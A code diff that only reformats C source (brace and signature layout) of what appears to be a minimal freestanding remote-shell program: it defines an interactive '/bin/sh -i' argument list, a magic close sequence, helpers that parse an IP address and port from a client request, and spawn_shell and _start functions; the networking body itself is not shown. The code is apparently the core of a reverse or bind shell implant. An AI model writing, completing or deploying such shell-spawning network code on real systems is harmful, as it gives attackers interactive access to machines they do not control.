@@ -6,15 +6,13 @@
 
 #define NULL ((void*)0)
 
-const unsigned char close_magic[] = {
-  0xde, 0xad, 0xbe, 0xef, 0xba, 0xbe, 0x00, 0x00
-};
+const unsigned char close_magic[] =
+    {0xde, 0xad, 0xbe, 0xef, 0xba, 0xbe, 0x00, 0x00};
 
-static const char* const argv[] = {
-  "/bin/sh", "-i", NULL
-};
+static const char* const argv[] = {"/bin/sh", "-i", NULL};
 
-static int is_close_request(union client_request* req) {
+static int
+is_close_request(union client_request* req) {
   int i;
   for (i = 0; i < sizeof(close_magic); ++i) {
     if (req->bytes[i] != close_magic[i])
@@ -23,7 +21,8 @@ static int is_close_request(union client_request* req) {
   return 1;
 }
 
-static in_addr_t str_to_addr(const char* s) {
+static in_addr_t
+str_to_addr(const char* s) {
   unsigned int i;
   unsigned char ip[4];
   for (i = 0; i < 4; ++i) {
@@ -40,7 +39,8 @@ static in_addr_t str_to_addr(const char* s) {
   return *(in_addr_t*)ip;
 }
 
-static inline in_port_t short_to_port(unsigned short p) {
+static inline in_port_t
+short_to_port(unsigned short p) {
 #ifdef BYTEORDER_LSB
   return (((in_port_t)p & 0xff00) >> 8) | (((in_port_t)p & 0x00ff) << 8);
 #else
@@ -48,7 +48,8 @@ static inline in_port_t short_to_port(unsigned short p) {
 #endif
 }
 
-static void spawn_shell(union client_request* req) {
+static void
+spawn_shell(union client_request* req) {
   int rc, client_fd;
   struct sockaddr_in addr;
 
@@ -83,7 +84,8 @@ early_fail:
   exit(rc);
 }
 
-void _start(void) {
+void
+_start(void) {
   char success;
   int rc, master_fd;
   in_addr_t addr;
